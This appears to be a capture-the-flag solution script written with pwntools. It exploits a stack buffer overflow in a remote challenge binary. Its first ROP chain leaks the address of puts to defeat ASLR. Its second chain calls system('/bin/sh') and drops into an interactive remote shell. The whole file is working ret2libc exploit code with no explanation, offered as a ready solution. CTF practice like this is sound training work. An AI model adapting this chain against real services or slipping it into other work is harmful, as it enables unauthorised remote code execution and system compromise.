from pwn import *

exe  = context.binary = ELF('./chall')
libc = ELF(exe.libc.path)

io = connect("ctf.nexus-security.club", 2711)

io.sendafter(b':', b"A"*72 + p64(0x40114a) + p64(exe.got.puts) + p64(exe.plt.puts) + p64(exe.sym.vuln))
io.recvline()
libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym.puts

io.sendafter(b':', b'A'*72 + p64(libc.address + 0x2846b) + p64(0x40114a) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.sym.system))
io.interactive()
